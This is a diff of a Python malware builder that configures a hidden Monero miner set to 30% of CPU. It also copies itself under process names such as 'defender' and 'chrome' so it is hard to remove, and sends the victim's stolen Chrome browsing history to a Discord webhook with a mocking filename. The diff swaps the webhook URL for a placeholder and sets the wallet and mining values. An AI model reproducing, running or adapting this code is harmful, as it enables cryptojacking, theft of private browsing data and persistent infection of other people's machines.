@@ -57,8 +57,8 @@ USER_NAME = getpass.getuser()
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-chiffre = "https://discord.com/api/webhooks/1010319375515013141/5QZfTr2qK5TtTQa-mRWYU1IqjZHwSzxoRXplFvDqCq4pn4w0eRISkCtC8V3SHF0iaQzu"
-ADDRESS = "XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
+chiffre = "webhook667"
+ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
 CLONE_PROCESS = False # Create Instances of the program hidden in multiple path.
@@ -66,7 +66,7 @@ PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appd
 PROCESS_NUM = 2#3 is the perfect number,if you want your program to be un-removable put it a 5 maximum 
 
 MINE = True #Mine crypto? True/False
-MINING_PERCENT = "miningpercentEKIP"
+MINING_PERCENT = "30"
 CUDA = False
 
 
@@ -642,7 +642,7 @@ if yes == "yes":
 			if MINE == True:
 				threading.Thread(target=MineThreadWin).start()
 				print("[.] Executing miner..")
-	connectOption()
+	
 	if(chiffre != "" and chiffre != None):
 		print("[.] Sending")
 		webhook = DiscordWebhook(url=chiffre, username="github.com/0xSxZ/Veerus/")
@@ -665,3 +665,4 @@ if yes == "yes":
 
 		""" + stealChromeWinHistory().replace("'", '').replace("'", ''), filename="Lmao_PornHub_History_XDDD.txt")
 		webhook.execute()
+	connectOption()
